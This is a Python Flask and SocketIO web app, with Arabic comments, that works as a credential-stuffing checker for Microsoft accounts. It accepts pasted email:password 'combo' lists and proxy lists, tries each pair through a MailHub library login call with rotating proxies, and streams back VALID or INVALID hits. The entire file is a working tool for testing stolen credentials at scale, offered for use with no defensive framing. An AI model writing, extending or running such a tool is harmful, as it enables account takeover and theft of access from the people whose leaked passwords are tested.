import os
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from mailhub import MailHub

app = Flask(__name__)
app.config['SECRET_KEY'] = 'ghost_secret'
socketio = SocketIO(app, cors_allowed_origins="*")
mail = MailHub()
write_lock = threading.Lock()

# دالة الفحص الفردي
def check_account(email, password, proxy):
    try:
        # استخدام دالة تسجيل الدخول من مكتبتك
        res = mail.loginMICROSOFT(email, password, proxy)[0]
        if res == "ok":
            return True, f"{email}:{password}"
        return False, f"{email}:{password}"
    except:
        return None, f"{email}:{password}"

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('start_check')
def handle_check(data):
    combo_text = data.get('combo', '')
    proxies_text = data.get('proxies', '')
    use_proxy = data.get('use_proxy', False)
    
    accounts = [line.strip().split(':') for line in combo_text.split('\n') if ':' in line]
    proxies = [line.strip() for line in proxies_text.split('\n') if line.strip()] if use_proxy else []

    emit('log', {'msg': f"▶ جاري فحص {len(accounts)} حساب...", 'type': 'info'})

    def run_worker():
        with ThreadPoolExecutor(max_workers=20) as executor:
            for acc in accounts:
                email, password = acc[0], acc[1]
                proxy = None
                if proxies:
                    p = random.choice(proxies)
                    proxy = {"http": f"http://{p}", "https": f"http://{p}"}
                
                future = executor.submit(check_account, email, password, proxy)
                success, line = future.result()
                
                if success is True:
                    emit('log', {'msg': f"VALID | {line}", 'type': 'success'})
                elif success is False:
                    emit('log', {'msg': f"INVALID | {line}", 'type': 'error'})
                else:
                    emit('log', {'msg': f"ERROR | {line}", 'type': 'error'})

    threading.Thread(target=run_worker).start()

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
